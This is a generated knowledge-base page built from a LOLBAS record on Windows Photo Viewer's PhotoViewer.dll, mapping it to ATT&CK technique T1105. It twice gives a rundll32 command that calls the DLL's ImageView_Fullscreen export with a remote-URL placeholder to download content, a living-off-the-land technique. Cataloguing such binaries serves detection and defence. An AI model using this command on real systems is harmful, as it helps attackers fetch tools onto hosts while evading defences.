---
parsed_by: focuslocust
source: lolbas
type: generated
---
# PhotoViewer.dll

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `photoviewer.dll` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/PhotoViewer.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Windows Photo Viewer

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/photoviewer.dll.md)
- Source verification: [source record](../../sources/lolbas/photoviewer.dll.md)

## Aliases

- `PhotoViewer.dll`
- `photoviewer.dll`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/photoviewer.dll.md)

## Source Verification

[source record](../../sources/lolbas/photoviewer.dll.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@avihayeldad'
Person: Avihay Eldad
- Person: Tommy Warren
Author: Avihay Eldad
Commands:
- Category: Download
Command: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
```
